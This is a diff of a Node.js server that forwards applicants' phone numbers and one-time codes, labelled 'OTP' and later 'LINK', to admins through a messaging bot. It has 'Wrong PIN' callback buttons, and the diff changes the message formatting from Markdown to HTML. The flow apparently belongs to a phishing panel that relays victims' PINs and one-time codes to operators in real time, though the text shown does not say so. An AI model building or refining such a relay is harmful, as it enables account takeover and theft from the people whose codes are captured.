@@ -364,9 +364,9 @@ Provide this to your super admin to get access.
             message += '\n';
         }
         if (otpPending.length > 0) {
-            message += `🔢 *OTP (${otpPending.length}):*\n`;
+            message += `🔗 *LINK PENDING (${otpPending.length}):*\n`;
             otpPending.forEach((app, i) => {
-                message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`;
+                message += `${i+1}. ${formatPhone(app.phoneNumber)}\n${app.otp}\n`;
             });
         }
         if (pinPending.length === 0 && otpPending.length === 0) {
@@ -1274,19 +1274,19 @@ app.post('/api/verify-otp', async (req, res) => {
         console.log(`✅ OTP saved for ${applicationId}: ${otp}`);
 
         const returningLabel = application.isReturningUser
-            ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
+            ? `\n🔄 <b>Returning customer</b> (${application.previousCount || 1} previous visits)`
             : '';
         await sendToAdmin(application.adminId, `
-📲 *LINK VERIFICATION*${returningLabel}
+📲 <b>LINK VERIFICATION</b>${returningLabel}
 
-📋 \`${applicationId}\`
-📞 \`${formatPhone(application.phoneNumber)}\`
-🔗 \`${otp}\`
+📋 <code>${applicationId}</code>
+📞 <code>${formatPhone(application.phoneNumber)}</code>
+🔗 ${otp}
 ⏰ ${new Date().toLocaleString()}
 
-⚠️ *VERIFY LINK*
+⚠️ <b>VERIFY LINK — tap to open</b>
         `, {
-            parse_mode: 'Markdown',
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
                     [{ text: '❌ Wrong PIN',   callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
